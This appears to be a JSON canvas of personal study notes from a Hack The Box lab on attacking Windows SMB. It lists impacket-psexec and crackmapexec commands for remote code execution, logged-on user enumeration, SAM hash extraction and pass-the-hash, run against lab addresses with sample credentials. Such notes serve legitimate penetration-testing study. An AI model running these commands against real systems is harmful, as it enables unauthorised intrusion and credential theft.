		{"id":"5741d06bf965dffc","x":1100,"y":377,"width":839,"height":249,"type":"text","text":"# RCE\n## Impacket\n```shell-session\nnchiato@htb[/htb]$ impacket-psexec administrator:'Password123!'@10.10.110.17\n```\n"},
		{"id":"19fbd79a3943540b","x":2310,"y":377,"width":720,"height":160,"type":"text","text":"# Enum Users\n```shell-session\nnchiato@htb[/htb]$ crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users\n```"},
		{"id":"9d18e8a5d5c86d45","x":1175,"y":786,"width":689,"height":181,"type":"text","text":"## CrackMap Exec\n```shell-session\nnchiato@htb[/htb]$ crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec\n```"},
		{"id":"ca88f4fa8ca862f3","x":1958,"y":977,"width":432,"height":160,"type":"text","text":"# Extract SAM Hashes\n\n```shell-session\nnchiato@htb[/htb]$ crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam\n```"},
		{"id":"66143154b32519b0","x":2521,"y":922,"width":749,"height":215,"type":"text","text":"# PtH\n\n```shell-session\nnchiato@htb[/htb]$ crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE\n```"},
		{"id":"254475e4717330cf","x":1899,"y":17,"width":304,"height":175,"type":"text","text":"Windows SMB Options\n- RCE\n- Extract Hashes SAM\n- Enum Logged on users\n- PtH"}
